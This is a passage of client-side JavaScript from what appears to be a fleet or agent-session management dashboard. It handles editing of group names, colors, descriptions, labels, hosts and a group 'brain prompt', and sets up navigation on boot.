        const updated = await patchGroupWithVersion(g, { name: v });
        if (!updated) return;
        g.name = v;
        loadGroups();
      } catch (e) {
        alert(e.message);
        $('gd-name').value = g.name;
      }
    };
    $('gd-color').onchange = async () => {
      try {
        const updated = await patchGroupWithVersion(g, { color: $('gd-color').value });
        if (!updated) return;
        g.color = $('gd-color').value;
        loadGroups();
      } catch (e) { alert(e.message); }
    };
    $('gd-desc').onblur = async () => {
      const v = $('gd-desc').value.trim();
      if (v === (g.description || '')) return;
      try {
        const updated = await patchGroupWithVersion(g, { description: v || null });
        if (!updated) return;
        g.description = v;
        loadGroups();
      } catch (e) { alert(e.message); }
    };
    // vt-0151: group brain prompt — explicit save (large textarea, not onblur)
    const saveBrain = $('gd-save-brain');
    if (saveBrain) saveBrain.onclick = async () => {
      const v = $('gd-brain-prompt').value;
      const status = $('gd-brain-status');
      status.textContent = 'saving…';
      try {
        const updated = await patchGroupWithVersion(g, { brain_prompt: v || null });
        if (!updated) { status.textContent = ''; return; }
        g.brain_prompt = v || null;
        status.textContent = v ? 'saved · injected into group dispatches' : 'saved · cleared';
      } catch (e) { status.textContent = 'error: ' + e.message; }
    };
    function renderLabels() {
      const row = $('gd-labels-chip-row');
      row.innerHTML = (g.labels || []).length
        ? (g.labels || []).map((l, i) =>
            `<span class="chip">${esc(l)} <button class="chip-x" data-rm-label="${i}">×</button></span>`).join(' ')
        : '<span style="color:var(--text-faint)">no labels yet</span>';
      row.querySelectorAll('[data-rm-label]').forEach(btn => {
        btn.onclick = async () => {
          const idx = parseInt(btn.dataset.rmLabel, 10);
          const newLabels = (g.labels || []).filter((_, i) => i !== idx);
          try {
            const updated = await patchGroupWithVersion(g, { labels: newLabels });
            if (!updated) return;
            g.labels = newLabels;
            renderLabels();
            loadGroups();
          } catch (e) { alert('remove label failed: ' + e.message); }
        };
      });
    }
    function renderHosts() {
      const row = $('gd-hosts-rows');
      row.innerHTML = (g.hosts || []).length
        ? (g.hosts || []).map(h =>
            `<div class="gd-host-row">
              <span>${esc(h.display_name || h.name)}</span>
              <span style="flex:1"></span>
              <button class="btn-ghost" data-rm-host="${h.id}" style="font-size:.75em">remove</button>
            </div>`).join('')
        : '<span style="color:var(--text-faint)">no hosts in this group</span>';
      row.querySelectorAll('[data-rm-host]').forEach(btn => {
        btn.onclick = async () => {
          // vt-0081: use api() helper (throws on !ok) instead of raw fetch.
          // Commit local state AFTER server confirms. Surface error to user.
          try {
            await api('DELETE', `/groups/${g.id}/hosts/${btn.dataset.rmHost}`);
            g.hosts = (g.hosts || []).filter(h => h.id !== btn.dataset.rmHost);
            renderHosts();
            $('gd-host-pick').innerHTML = state.hosts
              .filter(h => !(g.hosts||[]).find(gh => gh.id === h.id))
              .map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('');
            loadGroups();
          } catch (e) {
            alert('remove host failed: ' + e.message);
          }
        };
      });
    }
    renderLabels();
    renderHosts();
    $('gd-add-label-form').onsubmit = async (ev) => {
      ev.preventDefault();
      const inp = $('gd-new-label');
      const v = (inp.value || '').trim();
      if (!v) return;
      const newLabels = [...(g.labels || []), v];
      try {
        const updated = await patchGroupWithVersion(g, { labels: newLabels });
        if (!updated) return;
        g.labels = newLabels;
        inp.value = '';
        renderLabels();
        loadGroups();
      } catch (e) { alert('add label failed: ' + e.message); }
    };
    $('gd-add-host-form').onsubmit = async (ev) => {
      ev.preventDefault();
      const hostId = $('gd-host-pick').value;
      if (!hostId) return;
      try {
        await api('POST', `/groups/${g.id}/hosts`, { host_id: hostId });
        const added = state.hosts.find(h => h.id === hostId);
        if (added) g.hosts = [...(g.hosts || []), added];
        renderHosts();
        $('gd-host-pick').innerHTML = state.hosts
          .filter(h => !(g.hosts||[]).find(gh => gh.id === h.id))
          .map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('');
        loadGroups();
      } catch (e) { alert('add host failed: ' + e.message); }
    };
    modal.querySelector('[data-gd-close]').onclick = () => { modal.hidden = true; };
  }

  // ============ Boot ============
  async function boot() {
    readToken();
    // Load i18n dictionary BEFORE first render to avoid raw-key flash (auth page too)
    if (window.fleetI18n) {
      await window.fleetI18n.loadLang(localStorage.fleetLang || 'en');
      window.fleetI18n.wireSwitcher();
    }
    if (!state.token) { showAuth(); return; }
    showApp();
    wireSpawn();
    $('reload').onclick = () => {
      const btn = $('reload');
      btn.classList.remove('spin');
      void btn.offsetWidth;
      btn.classList.add('spin');
      refresh();
    };
    $('nav-dashboard').onclick = () => navigate('/dashboard');
    $('nav-archive').onclick = () => navigate('/archive');
    $('nav-cost').onclick = () => navigate('/cost');
    $('nav-groups').onclick = () => navigate('/groups');
    const wfNav = $('nav-workflows'); if (wfNav) wfNav.onclick = () => navigate('/workflows');
    const pNav = $('nav-prices'); if (pNav) pNav.onclick = () => navigate('/prices');
    // vt-0146: vault tab
    const vNav = $('nav-vault'); if (vNav) vNav.onclick = () => navigate('/vault');
    const vBack = $('vaultview-close'); if (vBack) vBack.onclick = () => navigate('/dashboard');
    // vt-0193: health dashboard nav
    const hNav = $('nav-health'); if (hNav) hNav.onclick = () => navigate('/health');
    const hBack = $('healthview-close'); if (hBack) hBack.onclick = () => navigate('/dashboard');
    const hReload = $('health-reload'); if (hReload) hReload.onclick = () => openHealthView();
    const wfNew = $('wf-new'); if (wfNew) wfNew.onclick = () => navigate('/workflows/new');
    const wfBack = $('workflowsview-close'); if (wfBack) wfBack.onclick = () => navigate('/dashboard');
    const wfvBack = $('workflowrunviewer-close'); if (wfvBack) wfvBack.onclick = () => navigate('/workflows');
    setOverlay(true, 'STANDBY', 'select a session');
    startPolling();
    applyRoute();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else { boot(); }
})();
